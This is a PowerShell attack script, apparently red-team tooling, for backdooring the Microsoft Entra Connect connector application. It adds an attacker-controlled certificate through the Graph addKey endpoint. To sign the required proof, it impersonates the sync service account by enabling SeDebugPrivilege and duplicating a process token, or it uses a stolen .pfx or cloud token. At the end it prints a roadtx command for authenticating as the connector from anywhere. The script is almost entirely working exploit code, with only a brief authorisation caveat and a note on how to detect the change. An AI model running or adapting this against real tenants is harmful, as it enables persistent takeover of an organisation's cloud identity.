<#
.SYNOPSIS
    Path B (bring-your-own-certificate). Plant an attacker-controlled certificate on the Entra
    Connect connector application via the Microsoft Graph addKey action, using the connector's
    existing key as proof of possession. The planted cert then authenticates as the connector.

.DESCRIPTION
    Run only against tenants and hosts you are authorised to test.

    Possession of an existing key is itself the authorisation to add another one. Microsoft
    Graph's addKey action requires a proof-of-possession (POP) JWT signed by one of the
    application's current certificates. It does not require a directory role, admin consent, or
    the Application.ReadWrite permission when an app rolls its own key. So anyone who can use the
    connector key once (in place on the host, or via a stolen .pfx) can append a second
    certificate they control.

    This never needs the private key to leave the machine, only to sign one POP token, so it also
    works against TPM-backed hosts. The cost is noise: the connector app ends with two
    keyCredentials, and a healthy connector has exactly one. That key-count delta is the primary
    detection (see README.md, Detection).

    On the Connect host, run with no arguments: the connector cert, AppId and tenant are
    auto-discovered, the proof is signed in place, and addKey is addressed by appId. Three ways to
    supply the existing key that signs the proof:

      (default)          On the Connect host, impersonate miiserver.exe (the ADSync sMSA) and use
                         the key in place. Nothing is exported, so this works with a TPM.
      -SignerPfx         A .pfx holding the current connector key, e.g. the Extract script output.
                         Portable; run from anywhere.
      -ConnectorToken    Cloud path: a Graph access token already minted for the connector app
                         (or any principal that can write the app's keyCredentials). No host
                         access and no POP needed; the token's rights authorise a direct PATCH.

    See README.md for detection and references.

.PARAMETER Tenant
    Tenant id or domain. Auto-discovered from the local Connect config when omitted on the host.

.PARAMETER AppId
    Connector application (client) id. Auto-discovered from the local Connect config when omitted.

.PARAMETER SignerPfx
    Path to a .pfx holding the current connector key (e.g. the Extract script output).

.PARAMETER SignerPfxPassword
    Password for -SignerPfx. Default: Stolen!Lab (matches the Extract script default).

.PARAMETER SignerThumbprint
    On the Connect host, use the key in place by thumbprint. Auto-discovered when omitted.

.PARAMETER ConnectorToken
    A Graph access token already issued for the connector app (cloud path; skips signing).

.PARAMETER Subject
    Subject/CN of the new attacker certificate. Default: "backdoor certificate". Change it to
    blend with the genuine cert name.

.PARAMETER OutPfx
    Where to save the new certificate and key. Default: .\backdoor.pfx

.PARAMETER OutPfxPassword
    Password for the new .pfx. Default: Passw0rd!Lab

.EXAMPLE
    # On the Connect host, no arguments: auto-discovers everything and plants the cert.
    .\Add-EntraConnectCertificate.ps1

.EXAMPLE
    # Off-host: sign the proof with a stolen .pfx from Path A.
    .\Add-EntraConnectCertificate.ps1 -Tenant contoso.onmicrosoft.com -AppId <connectorAppId> `
        -SignerPfx .\connector.pfx -SignerPfxPassword 'Stolen!Lab'
#>
[CmdletBinding(DefaultParameterSetName = "InPlace")]
param(
    # Tenant and AppId auto-discover from the local Connect config on the host when omitted.
    [Parameter(Mandatory = $false)] [string]$Tenant,
    [Parameter(Mandatory = $false)] [string]$AppId,

    [Parameter(ParameterSetName = "SignerPfx", Mandatory = $true)]
    [string]$SignerPfx,
    [Parameter(ParameterSetName = "SignerPfx", Mandatory = $false)]
    [string]$SignerPfxPassword = "Stolen!Lab",

    # In-place path (default). Thumbprint auto-discovers in the sMSA store when omitted.
    [Parameter(ParameterSetName = "InPlace", Mandatory = $false)]
    [string]$SignerThumbprint,

    [Parameter(ParameterSetName = "Cloud", Mandatory = $true)]
    [string]$ConnectorToken,

    [Parameter(Mandatory = $false)] [string]$Subject = "backdoor certificate",
    [Parameter(Mandatory = $false)] [string]$OutPfx = ".\backdoor.pfx",
    [Parameter(Mandatory = $false)] [string]$OutPfxPassword = "Passw0rd!Lab"
)

$ErrorActionPreference = "Stop"
$graph = "https://graph.microsoft.com"

# addKey proof audience - the (legacy AAD Graph) GUID Microsoft mandates for the POP token.
$AddKeyProofAudience = "00000002-0000-0000-c000-000000000000"

function ConvertTo-Base64Url([byte[]]$bytes) {
    [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

# Auto-discover the connector's AppId + tenant from the local Entra Connect config: the AAD
# connector's UserName connectivity parameter is "{appId}@tenantDomain". Returns $null off-host.
function Get-LocalConnectorIdentity {
    try { Import-Module ADSync -ErrorAction Stop } catch { return $null }
    $aad = Get-ADSyncConnector -ErrorAction SilentlyContinue |
        Where-Object { $_.ConnectivityParameters | Where-Object { $_.Name -eq 'UserName' -and $_.Value -match '@' } } |
        Select-Object -First 1
    if (-not $aad) { return $null }
    $userName = ($aad.ConnectivityParameters | Where-Object Name -eq 'UserName').Value
    if (-not $userName) { return $null }
    @{
        AppId  = ($userName -replace '[{}]', '') -replace '@.*$', ''
        Tenant = ($userName -split '@')[1]
    }
}

# ---------------------------------------------------------------------------------------------
# 1. Generate the new attacker certificate we intend to plant.
# ---------------------------------------------------------------------------------------------
function New-AttackerCertificate([string]$subject) {
    $key = [System.Security.Cryptography.RSA]::Create(2048)
    $request = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new(
        "CN=$subject", $key,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256,
        [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
    $notBefore = [DateTimeOffset]::UtcNow.AddDays(-1)
    $notAfter  = [DateTimeOffset]::UtcNow.AddDays(365)
    $request.CreateSelfSigned($notBefore, $notAfter)
}

# ---------------------------------------------------------------------------------------------
# 2. Build a "signer" over the existing connector key.
#
# A signer is a hashtable with:
#     CertDer : the existing certificate's DER bytes (for the x5t header)
#     Sign    : scriptblock([byte[]]) -> RS256 (SHA-256 / PKCS#1 v1.5) signature bytes
#
# Two implementations: one over a .pfx, one that uses the key in place on the Connect host.
# ---------------------------------------------------------------------------------------------
function New-PfxSigner([string]$pfxPath, [string]$pfxPassword) {
    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
        $pfxPath, $pfxPassword,
        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)
    $rsa = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
    @{
        CertDer = $cert.RawData
        Sign    = {
            param([byte[]]$data)
            $rsa.SignData($data,
                [System.Security.Cryptography.HashAlgorithmName]::SHA256,
                [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        }.GetNewClosure()
    }
}

# On the Connect host, impersonate miiserver.exe (runs as the ADSync sMSA) and sign with the
# non-exportable key in place. The key never leaves the host, so this works even with a TPM.
# When no thumbprint is given, the connector cert is auto-discovered in the sMSA store.
function New-InPlaceSigner([string]$thumbprint) {
    $nativeSigner = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public class InPlaceSigner
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr process, uint desiredAccess, out IntPtr token);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr existingToken, uint desiredAccess, IntPtr attributes,
                                        int impersonationLevel, int tokenType, out IntPtr newToken);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr token);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string host, string name, out LUID luid);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState,
                                             int len, IntPtr prev, IntPtr relen);

    [StructLayout(LayoutKind.Sequential)] struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)] struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)] struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }

    public static string ImpersonatedUser = "";
    public static byte[] CertificateDer = null;

    // Enable SeDebugPrivilege so an elevated admin (not only SYSTEM) can open the sMSA's token.
    public static void EnableDebug()
    {
        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, out hToken)) return;   // ADJUST_PRIVILEGES | QUERY
        LUID luid; if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid)) return;
        TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privilege.Luid = luid; tp.Privilege.Attributes = 0x2;
        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }

    static void Impersonate(int processId)
    {
        IntPtr processHandle = OpenProcess(0x0400, false, processId);            // PROCESS_QUERY_INFORMATION
        if (processHandle == IntPtr.Zero) throw new Exception("OpenProcess " + Marshal.GetLastWin32Error());
        IntPtr token, dup;
        if (!OpenProcessToken(processHandle, 0x0002 | 0x0008, out token))        // DUPLICATE | QUERY
            throw new Exception("OpenProcessToken " + Marshal.GetLastWin32Error() + " (run elevated / as SYSTEM)");
        if (!DuplicateTokenEx(token, 0x000F01FF, IntPtr.Zero, 2, 2, out dup))
            throw new Exception("DuplicateTokenEx " + Marshal.GetLastWin32Error());
        if (!ImpersonateLoggedOnUser(dup))
            throw new Exception("ImpersonateLoggedOnUser " + Marshal.GetLastWin32Error() + " (run elevated / as SYSTEM)");
    }

    // Impersonate and return the thumbprint of the sMSA's cert that has a CNG private key
    // (the connector cert); also captures its DER.
    public static string Discover(int processId)
    {
        Impersonate(processId);
        try
        {
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadOnly);
            X509Certificate2 chosen = null;
            foreach (X509Certificate2 c in store.Certificates)
            {
                RSA rsa = RSACertificateExtensions.GetRSAPrivateKey(c);
                if ((rsa as RSACng) != null) { chosen = c; break; }
            }
            store.Close();
            if (chosen == null) return null;
            CertificateDer = chosen.GetRawCertData();
            return chosen.Thumbprint;
        }
        finally { RevertToSelf(); }
    }

    // Impersonate the process, load the cert by thumbprint under that identity, sign, revert.
    public static byte[] Sign(int processId, string thumbprint, byte[] data)
    {
        Impersonate(processId);
        try
        {
            ImpersonatedUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadOnly);
            X509Certificate2 cert = null;
            foreach (X509Certificate2 c in store.Certificates)
                if (c.Thumbprint == thumbprint) { cert = c; break; }
            store.Close();
            if (cert == null) throw new Exception("cert " + thumbprint + " not found under impersonated user");

            CertificateDer = cert.GetRawCertData();
            RSA rsa = RSACertificateExtensions.GetRSAPrivateKey(cert);           // usable in place though non-exportable
            return rsa.SignData(data, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        }
        finally { RevertToSelf(); }
    }
}
"@
    if (-not ([System.Management.Automation.PSTypeName]'InPlaceSigner').Type) {
        Add-Type -TypeDefinition $nativeSigner -Language CSharp
    }

    $miiserver = Get-CimInstance Win32_Process -Filter "Name='miiserver.exe'" -ErrorAction SilentlyContinue
    if (-not $miiserver) { throw "miiserver.exe is not running - is this the Entra Connect Sync host?" }
    $miiProcessId = [int]$miiserver.ProcessId
    [InPlaceSigner]::EnableDebug()

    if ([string]::IsNullOrWhiteSpace($thumbprint)) {
        $thumb = [InPlaceSigner]::Discover($miiProcessId)
        if (-not $thumb) { throw "could not auto-discover the connector cert in the sMSA store - pass -SignerThumbprint." }
        Write-Host "[+] discovered connector cert: $thumb"
    } else {
        $thumb = $thumbprint.Replace(" ", "").ToUpper()
    }

    # Prime CertificateDer by signing one throwaway byte so we have the x5t material up front.
    [void][InPlaceSigner]::Sign($miiProcessId, $thumb, [byte[]](0))
    Write-Host "[+] impersonated: $([InPlaceSigner]::ImpersonatedUser)"

    @{
        CertDer = [InPlaceSigner]::CertificateDer
        Sign    = { param([byte[]]$data) [InPlaceSigner]::Sign($miiProcessId, $thumb, $data) }.GetNewClosure()
    }
}

# ---------------------------------------------------------------------------------------------
# 3. Sign a compact JWT (RS256) with a signer. x5t = base64url(SHA1(existing cert DER)).
# ---------------------------------------------------------------------------------------------
function New-SignedJwt([hashtable]$header, [hashtable]$claims, [hashtable]$signer) {
    $sha1 = [System.Security.Cryptography.SHA1]::Create()
    $header["x5t"] = ConvertTo-Base64Url ($sha1.ComputeHash($signer.CertDer))

    $headerJson = ($header | ConvertTo-Json -Compress)
    $claimsJson = ($claims | ConvertTo-Json -Compress)
    $signingInput = (ConvertTo-Base64Url ([Text.Encoding]::UTF8.GetBytes($headerJson))) + "." +
                    (ConvertTo-Base64Url ([Text.Encoding]::UTF8.GetBytes($claimsJson)))

    $signature = & $signer.Sign ([Text.Encoding]::UTF8.GetBytes($signingInput))
    "$signingInput." + (ConvertTo-Base64Url $signature)
}

# ---------------------------------------------------------------------------------------------
# 4. Mint a Graph token AS the connector (client-credentials + client_assertion / private_key_jwt).
# ---------------------------------------------------------------------------------------------
function Get-ConnectorGraphToken([string]$tenant, [string]$appId, [hashtable]$signer) {
    $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    $tokenEndpoint = "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token"
    $assertion = New-SignedJwt `
        -header @{ alg = "RS256"; typ = "JWT" } `
        -claims @{ aud = $tokenEndpoint; iss = $appId; sub = $appId; jti = [Guid]::NewGuid().ToString(); nbf = $now; exp = $now + 600 } `
        -signer $signer

    $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint -ContentType "application/x-www-form-urlencoded" -Body @{
        client_id             = $appId
        scope                 = "$graph/.default"
        grant_type            = "client_credentials"
        client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        client_assertion      = $assertion
    }
    Write-Host "[+] Got Graph token as the connector (signed by the existing key)."
    $response.access_token
}

# ---------------------------------------------------------------------------------------------
# 5a. addKey with proof of possession (on-host / stolen-pfx path).
# ---------------------------------------------------------------------------------------------
function Invoke-AddKeyWithProof([string]$token, [byte[]]$newCertDer, [string]$appId, [hashtable]$signer) {
    $now = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

    # The proof is signed by the existing key and asserts the app to itself. iss and sub = appId.
    $proof = New-SignedJwt `
        -header @{ alg = "RS256"; typ = "JWT" } `
        -claims @{ aud = $AddKeyProofAudience; iss = $appId; sub = $appId; jti = [Guid]::NewGuid().ToString(); nbf = $now; exp = $now + 300 } `
        -signer $signer

    $body = @{
        keyCredential = @{
            type  = "AsymmetricX509Cert"
            usage = "Verify"
            key   = [Convert]::ToBase64String($newCertDer)
        }
        passwordCredential = $null
        proof = $proof
    } | ConvertTo-Json -Depth 5

    # Address the app by appId (alternate key) so no ObjectId is needed.
    $response = Invoke-RestMethod -Method Post -Uri "$graph/v1.0/applications(appId='$appId')/addKey" `
        -Headers @{ Authorization = "Bearer $token" } -ContentType "application/json" -Body $body
    $response.keyId
}

# ---------------------------------------------------------------------------------------------
# 5b. Cloud path: PATCH keyCredentials directly (caller's token already authorises the write).
# ---------------------------------------------------------------------------------------------
function Invoke-AddKeyViaPatch([string]$token, [string]$appId, [byte[]]$newCertDer) {
    $appUrl = "$graph/v1.0/applications(appId='$appId')"
    $current = Invoke-RestMethod -Method Get -Uri "$appUrl`?`$select=keyCredentials" -Headers @{ Authorization = "Bearer $token" }

    $keys = @($current.keyCredentials)
    $keys += @{
        type  = "AsymmetricX509Cert"
        usage = "Verify"
        key   = [Convert]::ToBase64String($newCertDer)
    }
    $body = @{ keyCredentials = $keys } | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Method Patch -Uri $appUrl -Headers @{ Authorization = "Bearer $token" } `
        -ContentType "application/json" -Body $body | Out-Null
    Write-Host "[+] Cloud path: our certificate appended via PATCH keyCredentials."
    $keys.Count
}

# ---------------------------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------------------------
Write-Host "=== Path B - bring-your-own-certificate via Graph addKey ===" -ForegroundColor Cyan

# 1. Our new credential.
$attackerCert = New-AttackerCertificate $Subject
$newCertDer = $attackerCert.RawData
$pfxBytes = $attackerCert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12, $OutPfxPassword)
[IO.File]::WriteAllBytes($OutPfx, $pfxBytes)
Write-Host "[+] Generated attacker cert 'CN=$Subject' -> $OutPfx (password '$OutPfxPassword', thumbprint $($attackerCert.Thumbprint))"

# Resolve AppId / Tenant from the local Connect config when not supplied (host-only operation).
if (-not $AppId -or -not $Tenant) {
    $local = Get-LocalConnectorIdentity
    if ($local) {
        if (-not $AppId)  { $AppId  = $local.AppId;  Write-Host "[i] discovered AppId : $AppId" }
        if (-not $Tenant) { $Tenant = $local.Tenant; Write-Host "[i] discovered Tenant: $Tenant" }
    }
}

switch ($PSCmdlet.ParameterSetName) {
    "Cloud" {
        # No host key, no proof - the supplied token's rights authorise the write.
        if (-not $AppId) { throw "-AppId is required for the cloud path (can't auto-discover off-host)." }
        Write-Host "[i] Cloud path: using supplied connector/admin token, no host key needed."
        $count = Invoke-AddKeyViaPatch -token $ConnectorToken -appId $AppId -newCertDer $newCertDer
        Write-Host "[+] The connector app now has $count keyCredentials (healthy = 1). That delta is the detection." -ForegroundColor Green
    }
    default {
        if (-not $Tenant -or -not $AppId) {
            throw "could not determine -Tenant / -AppId (not supplied and not discoverable locally) - pass them explicitly."
        }

        # 2. Build the signer over the existing connector key (thumbprint auto-discovers if omitted).
        $signer = if ($PSCmdlet.ParameterSetName -eq "InPlace") {
            New-InPlaceSigner $SignerThumbprint
        } else {
            New-PfxSigner $SignerPfx $SignerPfxPassword
        }

        # 3+4. Token as the connector, then addKey (addressed by appId) with proof of possession.
        $token = Get-ConnectorGraphToken -tenant $Tenant -appId $AppId -signer $signer
        $newKeyId = Invoke-AddKeyWithProof -token $token -newCertDer $newCertDer -appId $AppId -signer $signer

        Write-Host ""
        Write-Host "[+] addKey SUCCEEDED - new keyId $newKeyId" -ForegroundColor Green
        Write-Host "[+] The connector app now carries an additional certificate (ours)."
        Write-Host "[+] Detection: a healthy connector app has exactly ONE key; it now has two."
    }
}

Write-Host ""
Write-Host "[i] Authenticate as the connector with our backdoor cert from any IP:"
Write-Host "    roadtx appauth -c $AppId -t $Tenant -r 6bf85cfa-ac8a-4be5-b5de-425a0d0dc016 --cert-pfx $OutPfx --pfx-pass '$OutPfxPassword'"
